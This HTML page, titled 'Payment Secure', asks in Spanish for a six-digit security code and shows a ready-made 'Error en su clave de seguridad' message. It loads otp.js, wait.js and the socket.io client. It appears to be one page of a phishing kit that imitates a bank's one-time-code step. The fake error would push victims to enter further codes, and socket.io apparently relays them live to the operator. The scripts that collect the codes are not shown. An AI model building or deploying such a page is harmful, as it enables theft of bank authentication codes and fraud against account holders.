<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Payment Secure</title>

    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />

    <script src="../../../js/functions.js"></script>
  </head>

  <body>
    <img src="img/logo.jpg" alt="" srcset="" width="100%" />
    <center>
      <img
        src="img/pass2.jpg"
        alt=""
        srcset=""
        width="8%"
        style="position: absolute; left: 33px; margin-top: 10px"
      />
      <input
        type="number"
        inputmode="numeric"
        id="txtDinamica"
        oninput="this.value = this.value.slice(0, 6)"
        placeholder="Ingresa clave de seguridad"
        style="
          width: 80%;
          border: none;
          border-bottom: 1px solid #dcdcdc;
          padding-left: 35px;
          height: 40px;
          font-size: 15px;
        "
      />
      <p style="margin-top: 10px; font-weight: 800; color: #ff0000">
        Error en su clave de seguridad
      </p>
    </center>

    <center>
      <input
        type="submit"
        id="btnDinamica"
        value="Continuar"
        style="
          width: 80%;
          background-color: #f08ba7;
          margin-top: 50px;
          height: 40px;
          border-radius: 20px;
        "
      />
    </center>
  </body>
  <script src="js/otp.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
  <script src="js/wait.js"></script>
</html>
